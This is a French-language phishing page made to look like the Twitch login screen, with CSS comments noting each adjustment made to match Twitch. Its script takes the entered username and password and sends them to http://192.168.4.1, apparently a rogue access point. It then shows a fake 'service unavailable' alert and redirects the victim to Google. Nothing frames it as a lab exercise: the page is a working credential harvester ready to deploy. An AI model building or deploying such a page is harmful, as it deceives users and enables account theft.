    height: 100vh;
    margin: 0;

.login-form {

    padding: 40px;
    border-radius: 6px; /* Rayon ajusté pour correspondre à Twitch */

    text-align: center;

.form-control {
    background-color: #0e0e10;
    border: 1px solid #343434; /* Ajuster la couleur des bords pour correspondre à Twitch */
    border-radius: 4px;
    color: #fff;
    margin-bottom: 20px;
    padding: 16px 14px; /* Ajuster le padding pour correspondre à Twitch */
    width: 90%;
    font-size: 14px;
}

.form-control:focus {
    border-color: #6441a5; /* Couleur de Twitch */
    outline: none;
}

.btn {
    background-color: #6441a5; /* Couleur du bouton ajustée */
    border: none;
    border-radius: 4px;
    color: white;
    cursor: pointer;
    padding: 20px 16px; /* Ajuster le padding pour correspondre à Twitch */
    width: 100%;
    font-size: 14px;
    font-weight: 700; /* Rendre le texte plus gras */
    margin-top: 20px; /* Ajuster l'espacement pour correspondre à Twitch */
    transition: background-color 0.2s;
}

.btn:hover {
    background-color: #53297d; /* Couleur au survol ajustée */
}

.login-footer {
    font-size: 13px; /* Taille ajustée pour correspondre à Twitch */
    margin-top: 32px; /* Ajuster l'espacement pour correspondre à Twitch */
    color: #adadb8; /* Couleur ajustée pour correspondre à Twitch */
}

    color: #adadb8; /* Couleur des liens ajustée */
    text-decoration: none;
    display: block;
    margin: 8px 0; /* Ajuster l'espacement pour correspondre à Twitch */

<body>
    <div class="login-form">
        <div class="login-image"></div> <!-- Div pour l'image du logo Twitch -->
        <div class="login-header">Se connecter à Twitch</div>
        <input type="text" id="email" class="form-control" placeholder="Identifiant">
        <input type="password" id="password" class="form-control" placeholder="Mot de passe">
        <button onclick="sendCredentials()" class="btn">Se connecter</button>
        <div class="login-footer">
            <a href="#" class="login-link">Problèmes de connexion ?</a>
            <a href="#" class="signup-link">Pas de compte ? Inscrivez-vous</a>
        </div>
    </div>

<script>
        function sendCredentials() { 	
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
            alert("Service indisponible.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
